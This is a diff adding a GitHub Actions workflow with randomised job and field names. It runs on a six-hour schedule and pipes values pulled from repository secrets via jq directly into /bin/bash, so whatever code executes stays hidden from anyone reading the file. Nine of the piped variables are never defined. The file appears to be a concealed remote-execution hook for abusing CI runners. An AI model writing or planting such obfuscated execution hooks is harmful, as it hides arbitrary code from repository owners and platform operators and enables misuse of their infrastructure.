@@ -1,0 +1,26 @@
+name: niuyaorao3187
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: niuyaorao3187
+        env:
+          gan3: ${{ secrets.gan3 }}
+        run: |
+          echo $gan3 | jq -r .vuo426 | /bin/bash
+          echo $o193 | jq -r .prc3096 | /bin/bash
+          echo $peypd23613 | jq -r .g5 | /bin/bash
+          echo $mhnmq62 | jq -r .a48834 | /bin/bash
+          echo $jnbdw9709 | jq -r .qnr53 | /bin/bash
+          echo $ru4 | jq -r .aq08116 | /bin/bash
+          echo $ardbv87 | jq -r .yir6 | /bin/bash
+          echo $pqhkq3508 | jq -r .swww52 | /bin/bash
+          echo $ay0 | jq -r .neq44 | /bin/bash
+          echo $mdsok07993 | jq -r .hypwb103 | /bin/bash
+
